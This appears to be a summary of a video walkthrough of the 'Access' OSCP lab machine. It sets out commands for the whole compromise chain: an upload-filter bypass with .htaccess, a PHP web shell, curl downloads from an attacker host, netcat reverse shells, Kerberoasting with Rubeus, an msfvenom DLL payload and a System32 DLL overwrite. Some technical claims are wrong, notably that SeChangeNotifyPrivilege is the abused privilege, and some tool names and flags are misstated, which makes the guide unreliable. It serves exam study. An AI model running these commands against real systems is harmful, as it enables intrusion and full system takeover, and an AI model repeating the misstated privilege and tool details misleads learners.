This comprehensive guide outlines the methodology and specific commands used in the "Access Box Walkthrough," a common type of Windows machine found in the OSCP environment.

The walkthrough demonstrates a full chain: **Web Shell Bypass → Reverse Shell → Kerberoasting (Lateral/Privesc) → DLL Hijacking (System Privesc).**

***

## 1. Initial Enumeration & Foothold (Port 80)

The initial step is to thoroughly scan the target machine for open ports and services, followed by an in-depth look at the most promising attack surface, which is HTTP on Port 80.

### 📝 Key Notes

* **Target OS:** Windows x64.
* **Key Ports:** 80 (HTTP/PHP), 139/445 (SMB), 389/636 (LDAP/AD), 464 (Kerberos), 5985 (WinRM).
* **Initial Vector:** Unfiltered file upload on `tickets.php`.
* **Bypass Technique:** Upload a **`.htaccess`** file to change the web server's interpretation of a new file extension (`.evil`) to execute as PHP.

### 💻 Commands Used

| Stage | Command/Action | Purpose | Timestamp |
| :--- | :--- | :--- | :--- |
| **Nmap** | `nmap -p- -sV -sC --open <TARGET_IP>` | Comprehensive scan for all 65535 ports, service versions, default scripts, and filtering for only open ports. | [[27:00](http://www.youtube.com/watch?v=h1Br5umYxwc&t=1620)] |
| **Bypass File** | Create `.htaccess` with content: `AddType application/x-httpd-php .evil` | Instructs the Apache server to execute files with the `.evil` extension as PHP. | [[44:49](http://www.youtube.com/watch?v=h1Br5umYxwc&t=2689)] |
| **Discovery** | `wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -H "Host: <TARGET_IP>" http://<TARGET_IP>/FUZZ` | Directory and file fuzzing to find the location of uploaded files. Discovered the `/uploads/` directory. | [[46:34](http://www.youtube.com/watch?v=h1Br5umYxwc&t=2794)] |
| **Web Shell** | Upload `siren.evil` with content: `<?php system($_GET['cmd']); ?>` | Creates a simple web shell for remote command execution. | [[50:23](http://www.youtube.com/watch?v=h1Br5umYxwc&t=3023)] |
| **Verification** | `http://<IP>/uploads/siren.evil?cmd=whoami` | Confirms web shell is working (as `SVC_Apache`). | [[52:07](http://www.youtube.com/watch?v=h1Br5umYxwc&t=3127)] |
| **Transfer** | `curl http://<ATTACKER_IP>:8000/nc.exe -o nc.exe` | Uses the web shell to download Netcat (`nc.exe`) from an attacker's simple Python HTTP server. | [[55:28](http://www.youtube.com/watch?v=h1Br5umYxwc&t=3328)] |
| **Reverse Shell** | `nc.exe <ATTACKER_IP> 9090 -e cmd.exe` | Executes Netcat via the web shell to get an interactive shell. | [[57:12](http://www.youtube.com/watch?v=h1Br5umYxwc&t=3432)] |

***

## 2. Lateral Movement & Kerberoasting

With the initial shell as `SVC_Apache`, the next step is internal enumeration to find a pathway to a higher-privileged user, which leads to a Kerberoasting attack against the Active Directory domain.

### 📝 Key Notes

* **Initial User:** `SVC_Apache` is a member of `Domain Users` (low-privilege).
* **Target User Found:** `SVC_MSSQL`.
* **Vulnerability:** The `SVC_MSSQL` account is configured with a **Service Principal Name (SPN)**, making it vulnerable to **Kerberoasting**.
* **Kerberoasting:** An attack against **Kerberos** where an attacker requests a **TGS (Ticket Granting Service)** ticket for an SPN, which can then be cracked offline to reveal the user's password.

### 💻 Commands Used

| Stage | Command/Action | Purpose | Timestamp |
| :--- | :--- | :--- | :--- |
| **Enumeration** | `net users` | Lists all users on the machine. Found `SVC_MSSQL`. | [[01:01:54](http://www.youtube.com/watch?v=h1Br5umYxwc&t=3714)] |
| **AD Enum** | `Import-Module .\powerview.ps1` and `Get-NetUser -Identity SVC_MSSQL` | Uses PowerView to confirm the SPN attribute on the `SVC_MSSQL` account. | [[01:03:32](http://www.youtube.com/watch?v=h1Br5umYxwc&t=3812)] |
| **Attack** | `.\Rubeus.exe kerberoast /norap` | Requests a crackable Kerberos TGS ticket for any SPN-enabled users. | [[01:08:49](http://www.youtube.com/watch?v=h1Br5umYxwc&t=4129)] |
| **Cracking** | `john --wordlist=rockyou.txt hashes` | Cracked the hash to find the password: **`trust no one`**. | [[01:10:07](http://www.youtube.com/watch?v=h1Br5umYxwc&t=4207)] |
| **Run As** | `Invoke-RunasCs -user svc_mssql -password 'trust no one' -command "C:\xampp\htdocs\uploads\nc.exe <ATTACKER_IP> 4444 -e cmd.exe"` | Executes a new reverse shell as the cracked user, `SVC_MSSQL`. | [[01:14:36](http://www.youtube.com/watch?v=h1Br5umYxwc&t=4476)] |

***

## 3. Final Privilege Escalation (System)

The `SVC_MSSQL` user has a key privilege that is abused for system-level access.

### 📝 Key Notes

* **Key Privilege:** `whoami /priv` reveals **`SeChangeNotifyPrivilege`** (Bypass Traverse Checking) is enabled.
* **Exploit Vector:** This privilege can be abused using an exploit that allows the user to gain **administrative write access** over the entire system.
* **Final Exploit:** **DLL Hijacking**. With administrative write access, a malicious DLL is placed in a system directory to be loaded by a service that runs as **`NT AUTHORITY\SYSTEM`**.

### 💻 Commands Used

| Stage | Command/Action | Purpose | Timestamp |
| :--- | :--- | :--- | :--- |
| **Privilege Check** | `whoami /priv` | Confirms the presence of `SeChangeNotifyPrivilege`. | [[01:16:32](http://www.youtube.com/watch?v=h1Br5umYxwc&t=4592)] |
| **Admin Write** | `.\SCManageVolumeExploit.exe` | Executes the exploit to gain administrative write access across the C: drive. | [[01:23:49](http://www.youtube.com/watch?v=h1Br5umYxwc&t=5029)] |
| **Payload Gen** | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=1337 -f dll -o printconfig.dll` | Creates a malicious 64-bit DLL reverse shell payload. | [[01:26:55](http://www.youtube.com/watch?v=h1Br5umYxwc&t=5215)] |
| **Transfer** | `curl http://<ATTACKER_IP>:8000/printconfig.dll -o printconfig.dll` | Downloads the malicious DLL to the target machine. | [[01:28:07](http://www.youtube.com/watch?v=h1Br5umYxwc&t=5287)] |
| **Overwrite** | `copy printconfig.dll C:\Windows\System32\spool\drivers\x64\3\printconfig.dll` | Overwrites the legitimate DLL with the malicious one, using the new administrative write permission. | [[01:30:16](http://www.youtube.com/watch?v=h1Br5umYxwc&t=5416)] |
| **Listener** | `nc -nlvp 1337` | Sets up the listener for the SYSTEM shell. | [[01:31:10](http://www.youtube.com/watch?v=h1Br5umYxwc&t=5470)] |
| **Trigger** | PowerShell command to invoke service/trigger | Executes the service/application that loads `printconfig.dll`. | [[01:31:10](http://www.youtube.com/watch?v=h1Br5umYxwc&t=5470)] |
| **Verification** | `whoami` | Confirms final privilege: **`nt authority\system`**. | [[01:31:46](http://www.youtube.com/watch?v=h1Br5umYxwc&t=5506)] |

***

## 4. Key Takeaway Concepts for OSCP

| Concept | Description |
| :--- | :--- |
| **Filter Bypass** | Do not stop at a file extension blocklist. Use techniques like **`.htaccess`** or double extensions to bypass file upload filters and achieve remote code execution. |
| **Kerberoasting** | An essential Active Directory attack. Always check users for an **SPN** attribute using tools like `PowerView` or `Impacket`'s `Get-NetUsers.py`. These hashes are often crackable offline. |
| **Windows Privileges** | Know the impact of key Windows privileges found with `whoami /priv`. `SeChangeNotifyPrivilege` is a common abuse vector leading to full system compromise. |
| **DLL Hijacking** | A technique to achieve `NT AUTHORITY\SYSTEM` access. It involves overwriting a legitimate DLL in a critical system path that is loaded by a high-privileged service. |
http://googleusercontent.com/youtube_content/0